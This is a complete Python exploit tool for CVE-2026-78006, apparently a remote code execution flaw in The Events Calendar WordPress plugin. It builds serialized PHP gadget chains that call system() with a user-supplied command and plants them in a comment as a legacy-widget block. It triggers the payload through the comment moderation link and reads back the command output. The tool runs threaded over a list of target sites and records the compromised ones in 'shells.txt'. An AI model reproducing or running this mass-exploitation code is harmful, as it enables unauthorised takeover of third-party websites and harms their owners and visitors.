#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import threading, requests, re, time, os, sys, json, base64, ctypes, urllib3, warnings, random, string
from queue import Queue, Empty
from urllib.parse import urlparse, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore")
os.environ["NO_PROXY"] = "*"
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
TIMEOUT = 25
SHELLS_FILE = "shells.txt"
DEFAULT_THREADS = 5
DEFAULT_CMD = "id"
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

targets_queue = Queue()
stats = {"total": 0, "done": 0, "vuln": 0, "exploited": 0, "safe": 0, "error": 0}
stats_lock = threading.Lock()
file_lock = threading.Lock()
print_lock = threading.Lock()

GLOBAL_CMD = DEFAULT_CMD
GLOBAL_MARKER = ""

ESC = "\033["
RESET_C = ESC + "0m"; BOLD_C = ESC + "1m"; DIM_C = ESC + "2m"
RED_C = ESC + "91m"; GREEN_C = ESC + "92m"; WHITE_C = ESC + "97m"
GRAY_C = ESC + "90m"; CYAN_C = ESC + "96m"; YELLOW_C = ESC + "93m"
GOLD_C = ESC + "33m"; LIGHT_YELLOW_C = ESC + "93m"
CLEAR_LINE = "\033[2K\r"

def enable_ansi():
    if os.name != "nt": return True
    try:
        k = ctypes.windll.kernel32
        h = k.GetStdHandle(-11)
        m = ctypes.c_uint32()
        if k.GetConsoleMode(h, ctypes.byref(m)):
            k.SetConsoleMode(h, m.value | 0x0004); return True
    except Exception:
        pass
    return False

ANSI = enable_ansi()

def ac(text, color):
    return str(text) if not ANSI else f"{color}{text}{RESET_C}"

def terminal_width():
    try: w = os.get_terminal_size().columns
    except Exception: w = 100
    return max(60, min(w, 150))

def set_terminal_title(title):
    try:
        if os.name == "nt": ctypes.windll.kernel32.SetConsoleTitleW(title)
        else:
            sys.stdout.write(f"\033]0;{title}\007"); sys.stdout.flush()
    except Exception:
        pass

NX_LOGO = [
    "███╗   ███╗███████╗",
    "████╗ ████║██╔════╝",
    "██╔████╔██║█████╗  ",
    "██║╚██╔╝██║██╔══╝  ",
    "██║ ╚═╝ ██║███████╗",
    "╚═╝     ╚═╝╚══════╝",
]

def full_banner():
    width = terminal_width()
    fw = max(60, min(width - 4, 112))
    pad = " " * max((width - fw) // 2, 0)

    def content(parts):
        raw = "".join(t for t, _ in parts)
        avail = fw - 4
        if len(raw) > avail:
            raw = raw[:avail - 3] + "..."; parts = [(raw, WHITE_C)]
        left = max((avail - len(raw)) // 2, 0)
        right = max(avail - len(raw) - left, 0)
        out = ac("║", YELLOW_C) + " " + (" " * left)
        for t, c in parts: out += ac(t, c)
        return out + (" " * right) + " " + ac("║", YELLOW_C)

    print()
    print(pad + ac("╔" + "═" * (fw - 2) + "╗", YELLOW_C))
    empty = ac("║", YELLOW_C) + " " * (fw - 2) + ac("║", YELLOW_C)
    print(pad + empty)
    lw = max(len(r) for r in NX_LOGO)
    la = fw - 2
    for row in NX_LOGO:
        lp = max((la - lw) // 2, 0); rp = max(la - lw - lp, 0)
        print(pad + ac("║", YELLOW_C) + " " * lp + ac(row, BOLD_C + GOLD_C) + " " * rp + ac("║", YELLOW_C))
    print(pad + empty)
    print(pad + ac("╠", YELLOW_C) + ac("═" * (fw - 2), GRAY_C) + ac("╣", YELLOW_C))
    print(pad + content([("TEC", BOLD_C + GOLD_C), ("   │   ", GRAY_C),
                         ("CVE-2026-78006  •  Comment-do_blocks() RCE", BOLD_C + WHITE_C)]))
    print(pad + content([("Marshal ZeroDay Hub", BOLD_C + GOLD_C)]))
    print(pad + ac("╠", YELLOW_C) + ac("═" * (fw - 2), GRAY_C) + ac("╣", YELLOW_C))
    print(pad + content([("Single-Event V2 template + moderation-hash trigger", DIM_C + GRAY_C)]))
    print(pad + ac("╚" + "═" * (fw - 2) + "╝", YELLOW_C))
    if ANSI:
        print(pad + "   " + ac("▀" * max(fw - 6, 1), DIM_C + YELLOW_C))
    print()

def resolve_path(p):
    if os.path.isabs(p): return p
    c = os.path.join(os.getcwd(), p)
    if os.path.exists(c): return c
    c2 = os.path.join(SCRIPT_DIR, p)
    if os.path.exists(c2): return c2
    return os.path.join(os.getcwd(), p)

def write_url(line, category):
    with file_lock:
        try:
            with open(os.path.join(SCRIPT_DIR, SHELLS_FILE), "a", encoding="utf-8") as f:
                f.write(f"[{category}] {line}\n")
        except Exception:
            pass

def mk_sess():
    s = requests.Session()
    s.headers["User-Agent"] = UA
    s.verify = False
    return s

# ================= Payload builders =================

def _sstr(data):
    raw = data.encode("utf-8")
    return "s:%d:\"%s\";" % (len(raw), data)

def build_callback_object(callback, arguments, method_key="anything"):
    std_body = _sstr("callback") + _sstr(callback)
    std_body += _sstr("arguments") + "a:%d:{" % len(arguments)
    for i, a in enumerate(arguments):
        std_body += "i:%d;%s" % (i, _sstr(a))
    std_body += "}"
    std_body += _sstr("is_empty") + "b:0;"
    std = "O:8:\"stdClass\":3:{%s}" % std_body
    cls = "Tribe__Utils__Callback"
    body = _sstr("items") + "a:1:{%s%s}" % (_sstr(method_key), std)
    body += _sstr("\x00*\x00prefix") + _sstr("callback_")
    body += _sstr("\x00*\x00method") + "N;"
    return "O:%d:\"%s\":3:{%s}" % (len(cls), cls, body)

def build_element_classes_intkey(cb):
    pair = "a:2:{i:0;%si:1;%s}" % (cb, _sstr("anything"))
    args = "a:1:{i:0;%s}" % pair
    cls = "Tribe\\Utils\\Element_Classes"
    body = _sstr("\x00*\x00results") + "a:0:{}"
    body += _sstr("\x00*\x00arguments") + args
    return "O:%d:\"%s\":2:{%s}" % (len(cls), cls, body)

def build_title_payload(command):
    cb = build_callback_object("system", [command])
    return build_element_classes_intkey(cb)

def build_instance_bytes(title_value):
    return ("a:1:{%s%s}" % (_sstr("title"), title_value)).encode("utf-8")

def build_block(instance_serialized):
    encoded = base64.b64encode(instance_serialized).decode("ascii")
    attrs = {"idBase": "tribe-widget-events-list",
             "instance": {"encoded": encoded, "hash": ""}}
    return "<!-- wp:legacy-widget %s /-->" % json.dumps(attrs, ensure_ascii=False)

# ================= Version detection =================

TEC_README_PATHS = [
    "/wp-content/plugins/the-events-calendar/readme.txt",
    "/wp-content/plugins/events-calendar-pro/readme.txt",
    "/wp-content/plugins/the-events-calendar-premium/readme.txt",
]

def _ver_tuple(v):
    parts = re.findall(r"\d+", v)
    return tuple(int(x) for x in parts[:4]) if parts else (0,)

def get_tec_version(base, sess):
    for p in TEC_README_PATHS:
        try:
            r = sess.get(base + p, timeout=TIMEOUT, allow_redirects=True)
            if r.status_code == 200:
                m = re.search(r"Stable tag:\s*([\d\.]+)", r.text, re.IGNORECASE)
                if m: return m.group(1)
        except Exception:
            continue
    return None

def is_vuln_version(ver):
    if not ver: return None
    try:
        return _ver_tuple(ver) <= (6, 17, 4)
    except Exception:
        return None

# ================= Extraction =================

def clean_html(text):
    clean = re.sub(r"<script[\s\S]*?</script>", " ", text, flags=re.I)
    clean = re.sub(r"<style[\s\S]*?</style>", " ", clean, flags=re.I)
    clean = re.sub(r"<!--[\s\S]*?-->", " ", clean)
    clean = re.sub(r"<[^>]+>", " ", clean)
    clean = (clean.replace("&lt;", "<").replace("&gt;", ">")
                  .replace("&amp;", "&").replace("&quot;", '"')
                  .replace("&#039;", "'").replace("&nbsp;", " "))
    clean = re.sub(r"[ \t]+", " ", clean)
    return clean

def extract_cmd_output(text, marker):
    start_tag = f"{marker}_START"
    end_tag = f"{marker}_END"
    if start_tag not in text or end_tag not in text:
        return None
    clean = clean_html(text)
    try:
        s = clean.index(start_tag) + len(start_tag)
        e = clean.index(end_tag, s)
        raw_out = clean[s:e]
    except ValueError:
        try:
            s = text.index(start_tag) + len(start_tag)
            e = text.index(end_tag, s)
            raw_out = text[s:e]
        except ValueError:
            return None
    out = re.sub(r"\s+", " ", raw_out).strip()
    out = re.sub(r"<[^>]*>", "", out).strip()
    return out if out else "(command executed, no output)"

# ================= Find single event pages =================

def find_single_event_pages(base, sess):
    """يجد صفحات الأحداث الفردية (single-event) حيث V2 template يشغّل do_blocks()."""
    pages = []

    # 1) REST API - tribe_events
    for ep in [
        "/wp-json/wp/v2/tribe_events?per_page=50&status=publish&_fields=id,link,comment_status",
        "/wp-json/tribe/events/v1/events?per_page=50",
    ]:
        try:
            r = sess.get(base + ep, timeout=TIMEOUT)
            if r.status_code == 200:
                data = r.json()
                items = data if isinstance(data, list) else data.get("events", [])
                for it in items:
                    link = it.get("link") or it.get("url")
                    cs = it.get("comment_status", "")
                    if link:
                        pages.append({"url": link, "id": it.get("id"), "comments": cs})
        except Exception:
            pass

    # 2) sitemap للـ single events
    if len(pages) < 5:
        try:
            for sm in ["/sitemap.xml", "/sitemap_index.xml", "/event-sitemap.xml",
                       "/events-sitemap.xml", "/tribe-events-sitemap.xml"]:
                r = sess.get(base + sm, timeout=TIMEOUT)
                if r.status_code == 200:
                    for m in re.finditer(r"<loc>([^<]+)</loc>", r.text, re.I):
                        u = m.group(1)
                        # single-event: يحتوي /event/name/ وليس /events/
                        if re.search(r"/event/[^/]+/?$", u):
                            pages.append({"url": u, "id": None, "comments": ""})
                    if pages: break
        except Exception:
            pass

    # 3) الصفحة الرئيسية كـ fallback (لكن نفضّلها أقل)
    if not pages:
        pages.append({"url": base + "/", "id": None, "comments": ""})

    # إزالة التكرار
    seen, out = set(), []
    for p in pages:
        if p["url"] not in seen:
            seen.add(p["url"]); out.append(p)
    return out[:20]

def check_comments_open(base, sess, page):
    """يتحقق أن التعليقات مفعلة على صفحة الحدث."""
    # من REST إن توفر ID
    if page.get("id"):
        try:
            r = sess.get(f"{base}/wp-json/wp/v2/tribe_events/{page['id']}",
                         timeout=TIMEOUT)
            if r.status_code == 200:
                cs = r.json().get("comment_status", "")
                if cs == "open": return True
                if cs == "closed": return False
        except Exception:
            pass
    if page.get("comments"):
        return page["comments"] == "open"

    # من HTML
    try:
        r = sess.get(page["url"], timeout=TIMEOUT)
        if r.status_code == 200:
            html = r.text
            # نموذج تعليق موجود + ليس "التعليقات مغلقة"
            if ('id="respond"' in html or 'comment-form' in html or
                'commentform' in html) and 'comments are closed' not in html.lower():
                return True
    except Exception:
        pass
    return False

def get_comment_form_fields(base, sess, page_url):
    """يستخرج comment_post_ID و _wpnonce و referer من نموذج التعليق."""
    fields = {}
    try:
        r = sess.get(page_url, timeout=TIMEOUT)
        if r.status_code != 200:
            return fields

        m = re.search(r'name=["\']comment_post_ID["\']\s+value=["\'](\d+)["\']', r.text)
        if not m:
            m = re.search(r'value=["\'](\d+)["\']\s+name=["\']comment_post_ID["\']', r.text)
        if m:
            fields["comment_post_ID"] = m.group(1)

        m = re.search(r'name=["\']_wpnonce["\']\s+value=["\']([a-f0-9]+)["\']', r.text)
        if m:
            fields["_wpnonce"] = m.group(1)

        m = re.search(r'name=["\']_wp_http_referer["\']\s+value=["\']([^"\']*)["\']', r.text)
        if m:
            fields["_wp_http_referer"] = m.group(1)

        m = re.search(r'<form[^>]+action=["\']([^"\']*wp-comments-post\.php[^"\']*)["\']', r.text)
        if m:
            fields["_action"] = m.group(1)
    except Exception:
        pass
    return fields

# ================= Step 1: Comment → moderation-hash → do_blocks() =================

def try_step1(base, sess):
    marker = GLOBAL_MARKER
    # الأمر مغلّف بـ marker مزدوج لضمان الاستخراج
    full_cmd = f"echo {marker}_START; {GLOBAL_CMD} 2>&1; echo {marker}_END"

    try:
        block = build_block(build_instance_bytes(build_title_payload(full_cmd)))
    except Exception:
        return (False, None)

    pages = find_single_event_pages(base, sess)

    for page in pages:
        # 1) تحقق من التعليقات
        if not check_comments_open(base, sess, page):
            continue

        # 2) استخرج حقول النموذج
        fields = get_comment_form_fields(base, sess, page["url"])
        real_pid = fields.get("comment_post_ID") or (str(page["id"]) if page.get("id") else "")
        if not real_pid:
            continue

        # 3) أرسل التعليق
        data = {
            "comment": block,
            "author": "poc_" + marker[:8],
            "email": f"{marker.lower()}@example.com",
            "url": "",
            "comment_post_ID": real_pid,
            "comment_parent": "0",
        }
        if "_wpnonce" in fields: data["_wpnonce"] = fields["_wpnonce"]
        if "_wp_http_referer" in fields: data["_wp_http_referer"] = fields["_wp_http_referer"]

        action = fields.get("_action") or (base + "/wp-comments-post.php")
        if not action.startswith("http"):
            action = base + action if action.startswith("/") else base + "/" + action

        try:
            r = sess.post(action, data=data,
                          timeout=TIMEOUT, allow_redirects=False,
                          headers={"Referer": page["url"]})
        except Exception:
            continue

        # 4) استخرج moderation-hash
        mod_url = None
        loc = r.headers.get("Location", "") or ""
        if "moderation-hash=" in loc:
            mod_url = loc
        # ابحث في HTML الرد
        if not mod_url and r.text:
            m = re.search(r'href=["\']([^"\']*moderation-hash=[^"\']+)', r.text)
            if m: mod_url = m.group(1)

        # 5) زُر رابط moderation-hash (هذا هو الـ trigger الحقيقي)
        if mod_url:
            if not mod_url.startswith("http"):
                mod_url = base + mod_url if mod_url.startswith("/") else base + "/" + mod_url
            try:
                rv = sess.get(mod_url, timeout=TIMEOUT, allow_redirects=True)
                out = extract_cmd_output(rv.text, marker)
                if out:
                    return (True, out)
            except Exception:
                pass

        # 6) fallback: زُر صفحة الحدث الفردي نفسها
        try:
            rv = sess.get(page["url"], timeout=TIMEOUT, allow_redirects=True)
            out = extract_cmd_output(rv.text, marker)
            if out:
                return (True, out)
        except Exception:
            pass

    return (False, None)

# ================= Combined scan =================

def scan_target(base):
    sess = mk_sess()
    try:
        ver = get_tec_version(base, sess)
        vuln_flag = is_vuln_version(ver)

        ok1, out1 = try_step1(base, sess)
        if ok1:
            return ("EXPLOITED", f"[CVE-2026-78006] {out1}")

        if vuln_flag is True:
            return ("VULN", f"TEC {ver} (<= 6.17.4)")
        if vuln_flag is False:
            return ("SAFE", f"TEC {ver} (>= 6.17.4.1)")
        if ver:
            return ("VULN", f"TEC {ver}")
        return ("ERROR", "TEC not detected")
    except Exception as ex:
        return ("ERROR", str(ex)[:100])
    finally:
        sess.close()

# ================= Status line =================

start_time = 0

def build_status_line():
    with stats_lock:
        t, d, v, e_, s, err = (stats["total"], stats["done"], stats["vuln"],
                                stats["exploited"], stats["safe"], stats["error"])
    elapsed = time.time() - start_time if start_time else 0
    rate = d / elapsed if elapsed > 0 else 0
    remain = t - d
    eta = remain / rate if rate > 0 else 0
    eta_str = f"{int(eta//3600):02d}:{int((eta%3600)//60):02d}:{int(eta%60):02d}"
    return (
        f"{BOLD_C}{CYAN_C}Scanned{RESET_C} [{WHITE_C}{d}{RESET_C}/{WHITE_C}{t}{RESET_C}]  "
        f"{BOLD_C}{GREEN_C}Vuln{RESET_C} [{WHITE_C}{v}{RESET_C}]  "
        f"{BOLD_C}{YELLOW_C}Exploited{RESET_C} [{WHITE_C}{e_}{RESET_C}]  "
        f"{BOLD_C}{DIM_C}Safe{RESET_C} [{WHITE_C}{s}{RESET_C}]  "
        f"{BOLD_C}{RED_C}ERR{RESET_C} [{WHITE_C}{err}{RESET_C}]  "
        f"{BOLD_C}{CYAN_C}Remaining{RESET_C} [{WHITE_C}{eta_str}{RESET_C}]"
    )

def worker():
    while True:
        try:
            item = targets_queue.get_nowait()
        except Empty:
            return
        base = item

        try:
            status, info = scan_target(base)
        except Exception as ex:
            status, info = ("ERROR", str(ex)[:100])

        with stats_lock:
            stats["done"] += 1
            if status == "EXPLOITED":
                stats["exploited"] += 1
                line = (f"{BOLD_C}{YELLOW_C}[EXPLOITED]{RESET_C} {WHITE_C}{base}{RESET_C}\n"
                        f"            {GREEN_C}>>>{RESET_C} {WHITE_C}{info}{RESET_C}")
            elif status == "VULN":
                stats["vuln"] += 1
                line = f"{BOLD_C}{GREEN_C}[VULN]{RESET_C} {base}  {DIM_C}{info}{RESET_C}"
            elif status == "SAFE":
                stats["safe"] += 1
                line = f"{DIM_C}[SAFE] {base} - {info}{RESET_C}"
            else:
                stats["error"] += 1
                line = f"{RED_C}[ERROR] {base} - {info}{RESET_C}"

        with print_lock:
            sys.stdout.write(CLEAR_LINE + line + "\n")
            sys.stdout.write(build_status_line())
            sys.stdout.flush()

        write_url(base, status)
        targets_queue.task_done()

def ask_cmd():
    raw = input(f"{BOLD_C}{LIGHT_YELLOW_C}Command (default {DEFAULT_CMD}): {RESET_C}").strip()
    return raw or DEFAULT_CMD

def run():
    global start_time, GLOBAL_CMD, GLOBAL_MARKER
    set_terminal_title("TEC CVE-2026-78006 | Marshal ZeroDay Hub")
    os.system("cls" if os.name == "nt" else "clear")
    full_banner()

    raw_tf = input(f"{BOLD_C}{LIGHT_YELLOW_C}Targets file (default list.txt): {RESET_C}").strip() or "list.txt"
    tf = resolve_path(raw_tf)
    if not os.path.exists(tf):
        print(f"{RED_C}File not found: {tf}{RESET_C}"); return

    tr = input(f"{BOLD_C}{LIGHT_YELLOW_C}Threads (default {DEFAULT_THREADS}): {RESET_C}").strip()
    try: threads = int(tr) if tr else DEFAULT_THREADS
    except Exception: threads = DEFAULT_THREADS
    threads = max(1, threads)

    GLOBAL_CMD = ask_cmd()
    GLOBAL_MARKER = "POC" + "".join(random.choices(string.ascii_uppercase + string.digits, k=12))

    print(f"\n{DIM_C}Command: {WHITE_C}{GLOBAL_CMD}{RESET_C}  "
          f"{DIM_C}Marker: {WHITE_C}{GLOBAL_MARKER}{RESET_C}")

    sites = []
    with open(tf, "r", encoding="utf-8", errors="ignore") as f:
        for ln in f:
            u = ln.strip()
            if not u or u.startswith("#"): continue
            if not u.lower().startswith(("http://", "https://")):
                u = "https://" + u
            sites.append(u.rstrip("/"))

    if not sites:
        print(f"{RED_C}No targets{RESET_C}"); return

    print(f"{GREEN_C}Loaded {len(sites)} target(s) | {threads} thread(s){RESET_C}")
    print(f"{DIM_C}Results -> {os.path.join(SCRIPT_DIR, SHELLS_FILE)}{RESET_C}\n")

    for s in sites: targets_queue.put(s)
    with stats_lock:
        stats.update({"total": len(sites), "done": 0, "vuln": 0,
                      "exploited": 0, "safe": 0, "error": 0})

    start_time = time.time()
    with print_lock:
        sys.stdout.write("\n" + build_status_line())
        sys.stdout.flush()

    workers = []
    for _ in range(min(threads, len(sites))):
        t = threading.Thread(target=worker, daemon=True)
        t.start(); workers.append(t)

    while True:
        with stats_lock:
            if stats["done"] >= stats["total"]: break
        time.sleep(0.4)

    targets_queue.join()
    for t in workers: t.join(timeout=0.3)

    print()
    print(f"{BOLD_C}{GOLD_C}Done. Check {SHELLS_FILE}{RESET_C}")

if __name__ == "__main__":
    try:
        run()
    except KeyboardInterrupt:
        print(f"\n{RED_C}Interrupted.{RESET_C}")
